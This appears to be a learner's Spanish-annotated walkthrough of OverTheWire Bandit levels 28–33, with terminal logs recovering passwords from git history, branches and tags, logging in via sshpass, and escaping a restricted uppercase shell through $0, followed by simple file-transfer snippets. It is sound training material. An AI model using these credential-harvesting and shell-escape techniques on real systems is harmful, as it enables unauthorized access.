bandit28@bandit:/tmp/tmp.yuStRuC7gE/repo$ git log
WARNING: terminal is not fully functional
Press RETURN to continue
commit c6dc61e6ffdc717253130886555d087cac472f50 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Wed Jan 11 19:18:53 2023 +0000

    fix info leak

commit 2c1f82f75ab09c89166dd9e6e351bf479fb2d48f
Author: Morla Porla <morla@overthewire.org>
Date:   Wed Jan 11 19:18:53 2023 +0000

    add missing data

commit 444da53e268c462d39cf7441a3bbf7af1832e21f
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:53 2023 +0000

    initial commit of README.md
bandit28@bandit:/tmp/tmp.yuStRuC7gE/repo$ git show c6dc61e6ffdc717253130886555d087cac472f50
WARNING: terminal is not fully functional
Press RETURN to continue
commit c6dc61e6ffdc717253130886555d087cac472f50 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Wed Jan 11 19:18:53 2023 +0000

    fix info leak

diff --git a/README.md b/README.md
index b302105..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+- password: xxxxxxxxxx

bandit28@bandit:/tmp/tmp.yuStRuC7gE/repo$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S' ssh bandit29@bandit.labs.overthewire.org -p 2220
--------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 29-30 : There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit29@bandit:~$ mktemp -d
/tmp/tmp.uUZoOvm6g4
bandit29@bandit:~$ cd /tmp/tmp.uUZoOvm6g4
bandit29@bandit:/tmp/tmp.uUZoOvm6g4$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo

bandit29@bandit:/tmp/tmp.uUZoOvm6g4$ ls -l
total 4
drwxrwxr-x 3 bandit29 bandit29 4096 Jan 25 09:39 repo
bandit29@bandit:/tmp/tmp.uUZoOvm6g4$ cd repo
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ ls -l
total 4
-rw-rw-r-- 1 bandit29 bandit29 131 Jan 25 09:39 README.md
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ git log
commit 8159c819f4d37d9491254035c9e74ffcb316652e (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:54 2023 +0000

    fix username

commit 23706c87f70872af9f04744569f7b6273647fb14
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:54 2023 +0000

bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ git show 8159c819f4d37d9491254035c9e74ffcb316652e
commit 8159c819f4d37d9491254035c9e74ffcb316652e (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:54 2023 +0000

    fix username

diff --git a/README.md b/README.md
index 2da2f39..1af21d3 100644
--- a/README.md
+++ b/README.md
@@ -3,6 +3,6 @@ Some notes for bandit30 of bandit.

 ## credentials

-- username: bandit29
+- username: bandit30
 - password: <no passwords in production!>

bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ git show 23706c87f70872af9f04744569f7b6273647fb14
commit 23706c87f70872af9f04744569f7b6273647fb14
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:54 2023 +0000

    initial commit of README.md

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..2da2f39
--- /dev/null
+++ b/README.md
@@ -0,0 +1,8 @@
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: <no passwords in production!>
+
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ git checkout dev
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ ls
code  README.md
bandit29@bandit:/tmp/tmp.uUZoOvm6g4/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

❯ sshpass -p 'xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS' ssh bandit30@bandit.labs.overthewire.org -p 2220
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 30-31 : There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.
------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit30@bandit:~$ mktemp -d
/tmp/tmp.X7errFe9Ef
bandit30@bandit:~$ cd /tmp/tmp.X7errFe9Ef
bandit30@bandit:/tmp/tmp.X7errFe9Ef$ ls  -l
total 4
drwxrwxr-x 3 bandit30 bandit30 4096 Jan 25 10:37 repo
bandit30@bandit:/tmp/tmp.X7errFe9Ef$ cd repo/
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ ls
README.md
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ cat README.md
just an epmty file... muahaha
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ git log
WARNING: terminal is not fully functional
Press RETURN to continue
commit c027ef6d59c4031d56a6c6d16a526af0e8eb8383 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:56 2023 +0000

    initial commit of README.md
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ git branch -a
WARNING: terminal is not fully functional
Press RETURN to continue
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ git tag  // RAMA FIRMADA QUE NO PERMUTA, SE MANTIENE INALTERABLE //
WARNING: terminal is not fully functional
Press RETURN to continue
secretbandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ git show secret
WARNING: terminal is not fully functional
Press RETURN to continue
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
bandit30@bandit:/tmp/tmp.X7errFe9Ef/repo$ exit
logout
Connection to bandit.labs.overthewire.org closed.

❯ sshpass -p 'OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt' ssh bandit31@bandit.labs.overthewire.org -p 2220
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 31-32 : There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit31@bandit:~$ mktemp -d
/tmp/tmp.yMgpv1YOEs
bandit31@bandit:~$ cd /tmp/tmp.yMgpv1YOEs
bandit31@bandit:/tmp/tmp.yMgpv1YOEs$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
Cloning into 'repo'...
drwxrwxr-x 3 bandit31 bandit31 4096 Jan 25 10:49 repo
bandit31@bandit:/tmp/tmp.yMgpv1YOEs$ cd repo
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ cat README.md
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git log
WARNING: terminal is not fully functional
Press RETURN to continue
commit bea1d8ed397d13455286bf53db933d097389b1d3 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:57 2023 +0000

    initial commit
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git tag
WARNING: terminal is not fully functional
Press RETURN to continue
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git brach -a
git: 'brach' is not a git command. See 'git --help'.

The most similar command is
        branch
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git branch -a
WARNING: terminal is not fully functional
Press RETURN to continue
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ nano key.txt
Error opening terminal: xterm-kitty.
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ export TERM=xterm
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ nano key.txt
Unable to create directory /home/bandit31/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ cat key.txt
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git add -f key.txt
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git commit -m "Creamos un nuevo archivo"
[master c8493d2] Creamos un nuevo archivo
 1 file changed, 1 insertion(+)

 bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git push -u origin master

 Writing objects: 100% (3/3), 332 bytes | 332.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:

bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git log
commit c8493d25ee0fa880ad36b7f511b8be1015d0e98a (HEAD -> master)
Author: bandit31 <bandit31@overthewire.org>
Date:   Wed Jan 25 10:52:58 2023 +0000

    Creamos un nuevo archivo

commit bea1d8ed397d13455286bf53db933d097389b1d3 (origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Wed Jan 11 19:18:57 2023 +0000

    initial commit
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git show
commit c8493d25ee0fa880ad36b7f511b8be1015d0e98a (HEAD -> master)
Author: bandit31 <bandit31@overthewire.org>
Date:   Wed Jan 25 10:52:58 2023 +0000

    Creamos un nuevo archivo

diff --git a/key.txt b/key.txt
new file mode 100644
index 0000000..1026c62
--- /dev/null

bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ git show c8493d25ee0fa880ad36b7f511b8be1015d0e98a
commit c8493d25ee0fa880ad36b7f511b8be1015d0e98a (HEAD -> master)
Author: bandit31 <bandit31@overthewire.org>
Date:   Wed Jan 25 10:52:58 2023 +0000

    Creamos un nuevo archivo

diff --git a/key.txt b/key.txt
new file mode 100644
index 0000000..1026c62
--- /dev/null
+++ b/key.txt
@@ -0,0 +1 @@
+May I come in?
bandit31@bandit:/tmp/tmp.yMgpv1YOEs/repo$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'rmCBvG56y58BXzv98yZGdO7ATVL5dW8y' ssh bandit32@bandit.labs.overthewire.org -p 2220
```


*Argumentos posicionales de Bash*
```
------------------------------------------------------------------------------------------------------------------
BANDIT 32-33 : After all this git stuff its time for another escape. Good luck!
-------------------------------------------------------------------------------------------------------------------
ME PASA TODO A MAYUSCULAS, por ende no me toma los comandos menos variables de entorno
>> hola
sh: 1: HOLA: not found
>> casa
sh: 1: CASA: not found
>>  /home/bandit32
sh: 1: /HOME/BANDIT32: not found
>> home
sh: 1: HOME: not found
>> &HOME
sh: 1: Syntax error: "&" unexpected
>> $HOME
sh: 1: /home/bandit32: Permission denied
>> $SHELL
WELCOME TO THE UPPERCASE SHELL
>> $0
$
$ whoami
bandit33
bandit33
$ bash
bandit33@bandit:~$ ls
uppershell
bandit33@bandit:~$ pwd
/home/bandit32
bandit33@bandit:~$ cd ..
bandit33@bandit:/home$ ls
bandit0   bandit13  bandit18  bandit22  bandit27      bandit29-git  bandit31-git  bandit6   drifter1   drifter15  drifter6     formulaone1  krypton1  krypton6
bandit1   bandit14  bandit19  bandit23  bandit27-git  bandit3       bandit32      bandit7   drifter10  drifter2   drifter7     formulaone2  krypton2  krypton7
bandit10  bandit15  bandit2   bandit24  bandit28      bandit30      bandit33      bandit8   drifter12  drifter3   drifter8     formulaone3  krypton3  ubuntu
bandit11  bandit16  bandit20  bandit25  bandit28-git  bandit30-git  bandit4       bandit9   drifter13  drifter4   drifter9     formulaone5  krypton4
bandit12  bandit17  bandit21  bandit26  bandit29      bandit31      bandit5       drifter0  drifter14  drifter5   formulaone0  formulaone6  krypton5
bandit33@bandit:/home$ cd bandit33
bandit33@bandit:/home/bandit33$ ls
README.txt
bandit33@bandit:/home/bandit33$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!

```


*Cuestionario de conceptos y comandos en Linux*










*Transferencia de datos-CURL*
```
---
PC1
---
python3 -m http.server 8080

---
PC2
---
curl -O http://192.168.1.60:8080/"nombre del archivo"
```

*Transferencia de datos-SCP*
```
---
PC1
---
scp file.txt k4rma@192.168.1.69:/home/k4rma/
k4rma password:
file.txt

---
PC2
---
ls
file.txt
```

*Transferencia de datos-WGET*
```
---
PC1
---
buscar ruta

---
PC2
---
sudo system systematl status apache2 (podria ser nginx o lightpd)
					  start
					  stop
wget --no-check-certificate -O /home/k4rma/nombre fichero http://192.168..60/ruta donde exportar
```



